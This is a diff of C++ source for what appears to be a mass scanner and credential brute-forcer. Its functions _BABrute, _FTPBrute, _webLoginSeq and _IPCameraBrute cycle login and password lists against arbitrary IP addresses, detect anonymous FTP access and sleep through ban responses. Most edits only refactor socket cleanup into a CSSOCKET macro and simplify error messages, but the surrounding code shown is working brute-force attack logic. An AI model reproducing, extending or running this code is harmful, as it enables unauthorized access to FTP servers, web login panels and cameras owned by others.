@@ -3,10 +3,9 @@
 #include <libssh/libssh.h>
 #include <sstream>
 #include <openssl/md5.h>
-#include "resource.h"
+#include "mainResources.h"
 #include "externFunctions.h"
 #include "externData.h"
-#pragma once
 
 #if defined(Q_OS_WIN32)
 #include <iphlpapi.h>
@@ -14,6 +13,7 @@
 #pragma comment(lib, "iphlpapi.lib")
 #endif
 int gMaxBrutingThreads = 200;
+fd_set write_fs;
 
 void BConInc()
 {
@@ -172,7 +172,7 @@ int OpenConnection(SOCKET *sock, const char *hostname, int port)
 	if ( connect(*sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR )
 	{
 		++offlines;
-		closesocket(*sock);
+		CSSOCKET(*sock);
 		return -1;
 	};
 	return 0;
@@ -185,6 +185,7 @@ void _baSSLWorker(char *ip, char *request, char *rvBuff)
 	ctx = SSL_CTX_new(method);   /* Create new context */
 	SSL_CTX_set_timeout(ctx, gTimeOut);
 	SOCKET sock;
+
 	if(ctx != NULL)
 	{
 		int result = OpenConnection(&sock, ip, 443);
@@ -220,12 +221,12 @@ void _baSSLWorker(char *ip, char *request, char *rvBuff)
 				};
 				SSL_shutdown(ssl);
 				SSL_free(ssl);
-				closesocket(sock);         /* close socket */
+				CSSOCKET(sock);
 				SSL_CTX_free(ctx);        /* release context */
 				return;
 			};
-		};
-		closesocket(sock);         /* close socket */
+		};		
+		CSSOCKET(sock);
 		SSL_CTX_free(ctx);        /* release context */
 	}
 	else
@@ -468,8 +469,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 	{
 		if(strstri(headerMsg, "400 Bad") != NULL)
 		{
-			shutdown(sock, SD_BOTH);
-			closesocket(sock);
+			CSSOCKET(sock);
 
 			strcpy(lps.other, "[400 Bad Request]");
 			isActive = 0;
@@ -489,9 +489,8 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				goon = true;
 			}
 			else
-			{
-				shutdown(sock, SD_BOTH);
-				closesocket(sock);
+			{		
+				CSSOCKET(sock);
 
 				strcpy(lps.other, QString("[404 Not Found (" + QString(path) + ")]").toLocal8Bit().data());
 				isActive = 0;
@@ -515,8 +514,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 
 		if(goon == false)
 		{
-			shutdown(sock, SD_BOTH);
-			closesocket(sock);
+			CSSOCKET(sock);
 
 			strcpy(lps.login, "NULL");
 			strcpy(lps.pass, "NULL");
@@ -525,8 +523,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 		};
 	};
 
-	shutdown(sock, SD_BOTH);
-	closesocket(sock);
+	CSSOCKET(sock);
 #pragma endregion
 
 	isActive = 1;
@@ -661,8 +658,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				while(cErrCode == 10038)
 				{
 					if(gDebugMode) stt->doEmitionDebugFoundData("[BA] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");
-					shutdown(sock, SD_BOTH);
-					closesocket(sock);
+					CSSOCKET(sock);
 					sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
 					cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
 					cErrCode = WSAGetLastError();
@@ -693,8 +689,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 					{
 						stt->doEmitionRedFoundData("[BA] Send error! [" + QString(ip) + "]");
 
-						shutdown(sock, SD_BOTH);
-						closesocket(sock);
+						CSSOCKET(sock);
 						isActive = 0;
 						strcpy(lps.login, "UNKNOWN");
 						return lps;
@@ -708,17 +703,14 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 						stt->doEmitionRedFoundData("[BA] Cannot connect to " + QString(ip) + "[" + QString::number(WSAErr) + "]");
 					};
 
-					shutdown(sock, SD_BOTH);
-					closesocket(sock);
+					CSSOCKET(sock);
 
 					isActive = 0;
-
 					strcpy(lps.login, "UNKNOWN");
 					return lps;
 				};
-
-				shutdown(sock, SD_BOTH);
-				closesocket(sock);
+				
+				CSSOCKET(sock);
 			};
 #pragma endregion
 			
@@ -755,9 +747,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				|| strstr(recvBuff, "403 Forbidden") != NULL
 				)
 			{
-#pragma region QTGUI_Area
 				stt->doEmition_BARedData("[.] 503/400/403 - Waiting 30sec (" + QString(ip) + ":" + QString::number(port) + ")");
-#pragma endregion
 
 				if(j > 0) --j;
 				Sleep(30000);
@@ -770,9 +760,8 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 			{
 				if(HTMLDebugMode) _DebugWriteHTMLToFile(request, recvBuff);
 
-#pragma region QTGUI_Area
 				stt->doEmitionRedFoundData("[-] 404 - Wrong path detected. (" + QString(ip) + ":" + QString::number(port) + QString(path) + ")");
-#pragma endregion
+
 				isActive = 0;
 				strcpy(lps.login, "UNKNOWN");
 				return lps;
@@ -912,8 +901,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 				while(cErrCode == 10038)
 				{
 					if(gDebugMode) stt->doEmitionDebugFoundData("[FTP] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");
-					shutdown(sockFTP, SD_BOTH);
-					closesocket(sockFTP);
+					CSSOCKET(sockFTP);
 					sockFTP = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
 					connectionResult = connect(sockFTP, (sockaddr*)&sockAddr, sizeof(sockAddr));
 					cErrCode = WSAGetLastError();
@@ -940,8 +928,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 					if(strstr(recvBuff, "451 The parameter is incorrect") != NULL
 						)
 					{
-						shutdown(sockFTP, SD_BOTH);
-						closesocket(sockFTP);
+						CSSOCKET(sockFTP);
 						isActive = 0;
 						stt->doEmition_BARedData("[*] Unknown protocol (451 Error) - " + QString(ip));
 						strcpy(lps.other, "Unknown protocol (451 Error)");
@@ -950,12 +937,10 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 
 					if(strstri(recvBuff, "only anonymous") != NULL)
 					{
-						shutdown(sockFTP, SD_BOTH);
-						closesocket(sockFTP);
+						CSSOCKET(sockFTP);
 						isActive = 0;
-#pragma region QTGUI_Area
 						stt->doEmition_BAGreenData("[*] Anonymous access detected - " + QString(ip));
-#pragma endregion
+
 						strcpy(lps.login, "anonymous");
 						strcpy(lps.pass, "1");
 						return lps;
@@ -965,8 +950,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 						|| strstr(recvBuff, "550-") != NULL
 						)
 					{
-						shutdown(sockFTP, SD_BOTH);
-						closesocket(sockFTP);
+						CSSOCKET(sockFTP);
 
 						isActive = 0;
 
@@ -980,8 +964,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 
 					if(strstr(recvBuff, "no such command"))
 					{
-						shutdown(sockFTP, SD_BOTH);
-						closesocket(sockFTP);
+						CSSOCKET(sockFTP);
 
 						isActive = 0;
 						stt->doEmition_BARedData("[-] 500 (Sorry, no such command) " + QString(ip));
@@ -996,8 +979,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 						)
 					{
 						j = 0;
-						shutdown(sockFTP, SD_BOTH);
-						closesocket(sockFTP);
+						CSSOCKET(sockFTP);
 						closedSocket = 1;
 						ZeroMemory(recvBuff, sizeof(recvBuff));
 						break;
@@ -1005,8 +987,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 
 					if(strstr(recvBuff, "421 ") != NULL || strstr(recvBuff, "421-") != NULL)
 					{
-						shutdown(sockFTP, SD_BOTH);
-						closesocket(sockFTP);
+						CSSOCKET(sockFTP);
 						closedSocket = 1;
 						ZeroMemory(recvBuff, sizeof(recvBuff));
 						break;
@@ -1015,8 +996,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 					if(strstri(recvBuff, "530 Sorry, no ANONYMOUS access allowed.") != NULL)
 					{
 						++i;
-						shutdown(sockFTP, SD_BOTH);
-						closesocket(sockFTP);
+						CSSOCKET(sockFTP);
 						closedSocket = 1;
 						ZeroMemory(recvBuff, sizeof(recvBuff));
 						break;
@@ -1032,8 +1012,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 #pragma region QTGUI_Area
 						stt->doEmition_BARedData("[-] FTP: 530 - Ban detected? Waiting 30sec (" + QString(ip) + ")");
 #pragma endregion
-						shutdown(sockFTP, SD_BOTH);
-						closesocket(sockFTP);
+						CSSOCKET(sockFTP);
 						closedSocket = 1;
 						if(j > 0) --j;
 						ZeroMemory(recvBuff, sizeof(recvBuff));
@@ -1079,8 +1058,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 							)
 						{
 							stt->doEmition_BARedData("FTP server (" + QString(ip) + ") appears to require SSL for specified user: " + QString(loginLst[i]));
-							shutdown(sockFTP, SD_BOTH);
-							closesocket(sockFTP);
+							CSSOCKET(sockFTP);
 
 							isActive = 0;
 
@@ -1146,8 +1124,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 							if(strstri(recvBuff2, "unknown command") != NULL || strstri(recvBuff2, "invalid command") != NULL)
 							{
 								stt->doEmitionYellowFoundData("[-] PASV failed. Router detected?");
-								shutdown(sockFTP, SD_BOTH);
-								closesocket(sockFTP);
+								CSSOCKET(sockFTP);
 								strcpy(lps.login, loginLst[i]);
 								strcpy(lps.pass, passLst[j]);
 								strcpy(lps.other, "ROUTER");
@@ -1197,10 +1174,9 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 											if(x <= 0 || strstr(recvBuff, "unknown command") != NULL) 
 											{
 												stt->doEmition_BAGreenData("[?] " + QString(pass) + " 	[MLSD&LIST failed or server closed connection.]");
-												shutdown(sockFTP, SD_BOTH);
-												closesocket(sockFTP);
-												shutdown(newSockFTP, SD_BOTH);
-												closesocket(newSockFTP);
+												
+												CSSOCKET(sockFTP);
+												CSSOCKET(newSockFTP);
 												closedSocket = 1;			
 												isActive = 0;
 												strcpy(lps.login, "UNKNOWN");
@@ -1210,8 +1186,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 										}
 										else stt->doEmition_BAGreenData("[+] " + QString(pass) + " 	[LIST succeeded]");
 
-										shutdown(newSockFTP, SD_BOTH);
-										closesocket(newSockFTP);
+										CSSOCKET(newSockFTP);
 									}
 									else
 									{
@@ -1239,8 +1214,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 							strcpy(lps.login, loginLst[i]);
 							strcpy(lps.pass, passLst[j]);
 
-							shutdown(sockFTP, SD_BOTH);
-							closesocket(sockFTP);
+							CSSOCKET(sockFTP);
 							isActive = 0;
 							return lps;
 						}
@@ -1251,15 +1225,14 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 							strcpy(lps.login, loginLst[i]);
 							strcpy(lps.pass, passLst[j]);
 
-							shutdown(sockFTP, SD_BOTH);
-							closesocket(sockFTP);
+							CSSOCKET(sockFTP);
 							isActive = 0;
 							return lps;
 						};
 					};
 				};
-				shutdown(sockFTP, SD_BOTH);
-				closesocket(sockFTP);
+											
+				CSSOCKET(sockFTP);
 				closedSocket = 1;
 				ZeroMemory(recvBuff, sizeof(recvBuff));
 			}
@@ -1273,19 +1246,9 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 
 				if(gThreads > 1 && WSAerr != 10060/*Timeout*/ && WSAerr != 10055/*POOLOVERFLOW*/ && WSAerr != 10061/*WSAECONNREFUSED*/ && WSAerr != 10054/*WSACONNABORTED*/ && WSAerr != 0) 
 				{
-					strcpy(err, "[FTPBrute] Cannot connect to ");
-					strcat(err, ip);
-					strcat(err, " [");
-					strcat(err, std::to_string((long double)WSAerr).c_str());
-					strcat(err, "]");
-
-#pragma region QTGUI_Area
-					stt->doEmitionRedFoundData(QString(err));
-#pragma endregion
+					stt->doEmitionRedFoundData("[FTPBrute] Cannot connect to " + QString(ip) + " " + QString(std::to_string((long double)WSAerr).c_str()));
 				};
-
-				shutdown(sockFTP, SD_BOTH);
-				closesocket(sockFTP);		
+				CSSOCKET(sockFTP);	
 				isActive = 0;
 				strcpy(lps.login, "UNKNOWN");
 				return lps;
@@ -1299,8 +1262,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 			};
 		};
 	};
-	shutdown(sockFTP, SD_BOTH);
-	closesocket(sockFTP);
+	CSSOCKET(sockFTP);
 	isActive = 0;
 	strcpy(lps.login, "UNKNOWN");
 	return lps;
@@ -1365,9 +1327,9 @@ int _sslConnectTo(char *iph, int porth, char *requesth, conSTR *CSTR)
 						{
 							if(HTMLDebugMode) _DebugWriteHTMLToFile(requesth, recvBuff2);
 							delete[] recvBuff2;
-							recvBuff2 = NULL;
-							shutdown(sock, SD_BOTH);
-							closesocket(sock);
+							recvBuff2 = NULL;				
+							CSSOCKET(sock);
+
 							++Overl;
 
 							CSTR->lowerBuff = new char[11];
@@ -1392,8 +1354,7 @@ int _sslConnectTo(char *iph, int porth, char *requesth, conSTR *CSTR)
 
 							delete[] recvBuff2;
 							recvBuff2 = NULL;
-							shutdown(sock, SD_BOTH);
-							closesocket(sock);
+							CSSOCKET(sock);
 							CSTR->lowerBuff = new char[12];
 							strcpy(CSTR->lowerBuff, "[IGNR_ADDR]");
 
@@ -1411,8 +1372,7 @@ int _sslConnectTo(char *iph, int porth, char *requesth, conSTR *CSTR)
 				};
 
 				SSL_free(ssl);
-				shutdown(sock, SD_BOTH);
-				closesocket(sock);         /* close socket */
+				CSSOCKET(sock);
 				SSL_CTX_free(ctx);        /* release context */
 
 				if(bytes == 0 || recvBuff2 == NULL)
@@ -1442,8 +1402,7 @@ int _sslConnectTo(char *iph, int porth, char *requesth, conSTR *CSTR)
 			{
 				delete[] recvBuff2;
 				recvBuff2 = NULL;
-				shutdown(sock, SD_BOTH);
-				closesocket(sock);         /* close socket */
+				CSSOCKET(sock);
 				SSL_free(ssl);
 				SSL_CTX_free(ctx);        /* release context */
 				CSTR->lowerBuff = new char[1];
@@ -1469,7 +1428,7 @@ void __deleteExcessiveNullBytes(char *buff, int sz)
 	};
 };
 struct linger linger = { 0 };
-int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *CSTR, int force)
+int Connector::_EstablishConnection(char *ip, int port, char *request, conSTR *CSTR, int force)
 {
 	CSTR->lowerBuff = NULL;
 	if(strlen(ip) == 0) 
@@ -1483,10 +1442,7 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 		return -1;
 	};
 
-	int recvBuffSize = 0;
 	char *recvBuff2 = NULL;
-	char request[2049] = {0};
-	strcpy(request, requesth);
 	sockaddr_in sockAddr;  
 	sockAddr.sin_family = AF_INET;  
 	sockAddr.sin_port = htons(port);
@@ -1508,33 +1464,19 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 	SOCKET sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
 	while(sock == INVALID_SOCKET)
 	{
-		char temp[64] = {0};
-		strcpy(temp, "Cannot create socket - ");
-		strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
-		strcat(temp, " - ");
-		strcat(temp, ip);
-		strcat(temp, ":");
-		strcat(temp, std::to_string((long double)port).c_str());
+		stt->doEmitionRedFoundData("[Cannot create socket]");
 
-#pragma region QTGUI_Area
-		stt->doEmitionRedFoundData(QString(temp));
-#pragma endregion
-
-		shutdown(sock, SD_BOTH);
-		closesocket(sock);
+		CSSOCKET(sock);
 		Sleep(500);
 		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
 	};
 
-	int iiError = WSAGetLastError();
-	while(iiError == 10038)
+	while(WSAGetLastError() == 10038)
 	{
-		if(gDebugMode) stt->doEmitionDebugFoundData("[ConnectTo] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");
+		if(gDebugMode) stt->doEmitionDebugFoundData("10038 occured - [" + QString(ip) + ":" + QString::number(port) + "]");
 
-		shutdown(sock, SD_BOTH);
-		closesocket(sock);
+		CSSOCKET(sock);
 		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
-		iiError = WSAGetLastError();
 	};
 #if defined(WIN32)
 	u_long FAR cmd = 1;
@@ -1543,82 +1485,48 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 	if( fcntl( sock , F_SETFL, O_NDELAY ) == -1 )
 #endif
 	{
-		char temp[64] = {0};
-		strcpy(temp, "Error setting non-blocking mode - ");
-		strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
-		strcat(temp, " - ");
-		strcat(temp, ip);
-		strcat(temp, ":");
-		strcat(temp, std::to_string((long double)port).c_str());
-
-#pragma region QTGUI_Area
-		stt->doEmitionRedFoundData(QString(temp));
-#pragma endregion
-
-		shutdown(sock, SD_BOTH);
-		closesocket(sock);
-	}
-
+		stt->doEmitionRedFoundData("[FIONBIO failed]");
+	};
+						
+	int recvBuffSize = 0;
 	int on = 1;
-	linger.l_onoff = 1;
-	linger.l_linger = 30;
+	linger.l_onoff = 0;
+	linger.l_linger = 10;
 	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char *) &on, sizeof(on));
 	setsockopt(sock, SOL_SOCKET, SO_LINGER, (const char *) &linger, sizeof(linger));
+		
+	fd_set read_fs;
+	FD_ZERO(&read_fs);
+	FD_SET(sock, &read_fs);
 
 	int iError, iResult = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
+
 	if(iResult == SOCKET_ERROR)
 	{
 		iError = WSAGetLastError();
 		while(iError == 10038)
 		{
-			if(gDebugMode) stt->doEmitionDebugFoundData("[ConnectTo] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");
+			if(gDebugMode) stt->doEmitionDebugFoundData("10038 occured - [" + QString(ip) + ":" + QString::number(port) + "]");
 
-			shutdown(sock, SD_BOTH);
-			closesocket(sock);
+			CSSOCKET(sock);
 			sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
 			iResult = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
 			iError = WSAGetLastError();
 		};
+
 		if(iError == 10035)
 		{
-			fd_set read_fs;
-			FD_ZERO(&read_fs); 
-			FD_SET(sock, &read_fs);
 			timeval tv = { gTimeOut, 0 };
+			iResult = select(sock + 1, NULL, &read_fs, NULL, &tv);
 
-			iResult = select(sock + 1, NULL, &read_fs, 0, &tv);
-			int cErrCode = WSAGetLastError();
-			while(cErrCode == 10038)
-			{
-				if(gDebugMode) stt->doEmitionDebugFoundData("[ConnectTo] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");
-
-				shutdown(sock, SD_BOTH);
-				closesocket(sock);
-				FD_CLR(sock, &read_fs); 
-				sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
-				connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
-				iResult = WSAGetLastError();
-				if(iResult == 10038) continue;
-				FD_SET(sock, &read_fs);
-				iResult = select(sock + 1, NULL, &read_fs, 0, &tv);
-				cErrCode = WSAGetLastError();
-			};
-
+			int cErrCode;
 			if (iResult == SOCKET_ERROR) 
 			{
 				++offlines;
-				char temp[128] = {0};
-				strcpy(temp, "[Omitting IP!] Select error - ");
-				strcat(temp, std::to_string((long double)cErrCode).c_str());
-				strcat(temp, " - ");
-				strcat(temp, ip);
-				strcat(temp, ":");
-				strcat(temp, std::to_string((long double)port).c_str());
-				strcat(temp, ";");
-#pragma region QTGUI_Area
-				stt->doEmitionRedFoundData(QString(temp));
-#pragma endregion
-				ZeroMemory(temp, sizeof(temp));
+
+				stt->doEmitionRedFoundData("[Omitting IP] Select error - " + 
+					QString(std::to_string((long double)cErrCode).c_str()) + 
+					" - " + QString(ip) + ":" + QString(std::to_string((long double)port).c_str()));
 			}
 			else
 			{
@@ -1629,12 +1537,12 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 					{
 						if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
 						Activity += strlen(request);
-						int x = 256;
 						char recvBuff[4096] = {0};
 						recvBuff2 = new char[RECV_MAX_SIZE];
 						ZeroMemory(recvBuff2, RECV_MAX_SIZE);
 
 						int bTO;
+						int x = 256;
 						while (x > 0)				
 						{
 							ZeroMemory(recvBuff, sizeof(recvBuff));
@@ -1647,9 +1555,7 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 								delete[] recvBuff2;
 								recvBuff2 = NULL;
 
-								FD_CLR(sock, &read_fs);
-								shutdown(sock, SD_BOTH);
-								closesocket(sock);
+								CSSOCKET(sock);
 								++Overl;
 
 								CSTR->lowerBuff = new char[11];
@@ -1663,89 +1569,40 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 					else
 					{
 						++offlines;
-						char temp[128] = {0};
-						strcpy(temp, "Send error! - ");
-						strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
-						strcat(temp, " - ");
-						strcat(temp, ip);
-						strcat(temp, "; sock: ");
-						strcat(temp, std::to_string((long double)sock).c_str());
-
-#pragma region QTGUI_Area
-						stt->doEmitionRedFoundData(QString(temp));
-#pragma endregion
-						ZeroMemory(temp, sizeof(temp));
+						stt->doEmitionRedFoundData("Send error " + QString(ip) + " - " + QString(std::to_string((long double)WSAGetLastError()).c_str()));
 					};
 				};
 			};
-			FD_CLR(sock, &read_fs);
-			shutdown(sock, SD_BOTH);
-			closesocket(sock);
 		}
 		else 
 		{
 			++offlines;
-			char temp[128] = {0};
-			int err = iError;
-			if(err == 10055) 
+			if(iError == 10055) 
 			{
-				strcpy(temp, "-Connection pool depleted- ");
-#pragma region QTGUI_Area
-				stt->doEmitionRedFoundData("[SOCKERR 10055] " + QString(temp) + QString(ip) + ":" + QString::number(port));
-#pragma endregion
-				shutdown(sock, SD_BOTH);
-				closesocket(sock);
-				Sleep(60000);
+				stt->doEmitionRedFoundData("[SOCKERR 10055] " + QString("Connection pool depleted ") + QString(ip) + ":" + QString::number(port));
 			}
-			else if(err == 10049)
+			else if(iError == 10049)
 			{
-				strcpy(temp, "[ADDR_NOT_AVAIL - ");
-				strcat(temp, ip);
-				strcat(temp, ":");
-				strcat(temp, std::to_string((long double)port).c_str());
-				strcat(temp, " - ");
-				strcat(temp, std::to_string((long double)err).c_str());
-				strcat(temp, "]");
-#pragma region QTGUI_Area
-				stt->doEmitionRedFoundData(QString(temp));
-#pragma endregion
-				shutdown(sock, SD_BOTH);
-				closesocket(sock);
+				stt->doEmitionRedFoundData("[ADDR_NOT_AVAIL] " + QString(ip) +
+											":" + QString(std::to_string((long double)port).c_str()) + 
+											" - " + std::to_string((long double)iError).c_str());
 			}
 			else
 			{
-				strcpy(temp, "[Unpredictable error - ");
-				strcat(temp, ip);
-				strcat(temp, ":");
-				strcat(temp, std::to_string((long double)port).c_str());
-				strcat(temp, " - ");
-				strcat(temp, std::to_string((long double)err).c_str());
-				strcat(temp, "]");
-				strcat(temp, "; sock: ");
-				strcat(temp, std::to_string((long double)sock).c_str());
-#pragma region QTGUI_Area
-				stt->doEmitionRedFoundData(QString(temp));
-#pragma endregion
-				shutdown(sock, SD_BOTH);
-				closesocket(sock);
+				stt->doEmitionRedFoundData("[Unpredictable error] " + QString(ip) +
+											":" + QString(std::to_string((long double)port).c_str()) + 
+											" - " + std::to_string((long double)iError).c_str());
 			};
 		};
 	}
 	else
 	{
-		char temp[128] = {0};
-		strcpy(temp, "[?!] Strange behavior detected - ");
-		strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
-		strcat(temp, " - ");
-		strcat(temp, ip);
-		strcat(temp, ":");
-		strcat(temp, std::to_string((long double)port).c_str());
-		strcat(temp, "; sock: ");
-		strcat(temp, std::to_string((long double)sock).c_str());
-#pragma region QTGUI_Area
-		stt->doEmitionRedFoundData(QString(temp));
-#pragma endregion
+		stt->doEmitionRedFoundData("[?!] Strange behavior detected - " + 
+										QString(std::to_string((long double)WSAGetLastError()).c_str()) + 
+										" - " + QString(ip) + ":" + QString(std::to_string((long double)port).c_str()));
 	};
+	
+	CSSOCKET(sock);
 
 	if( globalScanFlag == false && force == 0) 
 	{
@@ -1765,7 +1622,7 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 
 		delete []recvBuff2;
 		recvBuff2 = NULL;
-		if(HTMLDebugMode) _DebugWriteHTMLToFile(requesth, CSTR->lowerBuff);
+		if(HTMLDebugMode) _DebugWriteHTMLToFile(request, CSTR->lowerBuff);
 		return 0;
 	}
 	else 
@@ -2240,8 +2097,7 @@ int _webLoginSeq(char *request, char *login, char *pass, char *ip, int port, int
 
 	while(cErrCode == 10038)
 	{
-		shutdown(sock, SD_BOTH);
-		closesocket(sock);
+		CSSOCKET(sock);
 		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
 		cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
 		cErrCode = WSAGetLastError();
@@ -2255,11 +2111,8 @@ int _webLoginSeq(char *request, char *login, char *pass, char *ip, int port, int
 
 		if(send(sock, request, strlen(request), 0) == SOCKET_ERROR) 	
 		{
-#pragma region QTGUI_Area
 			stt->doEmitionRedFoundData("[" + QString(type) + "] Send error! [" + QString(ip) + "]");
-#pragma endregion
-			shutdown(sock, SD_BOTH);
-			closesocket(sock);
+			CSSOCKET(sock);
 			return 0;
 		}
 		else 
@@ -2293,15 +2146,13 @@ int _webLoginSeq(char *request, char *login, char *pass, char *ip, int port, int
 
 			if(result)
 			{
-				shutdown(sock, SD_BOTH);
-				closesocket(sock);
+				CSSOCKET(sock);
 				return 1;
 			};
 		};
 	};
 
-	shutdown(sock, SD_BOTH);
-	closesocket(sock);
+	CSSOCKET(sock);
 	return 0;
 };
 lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
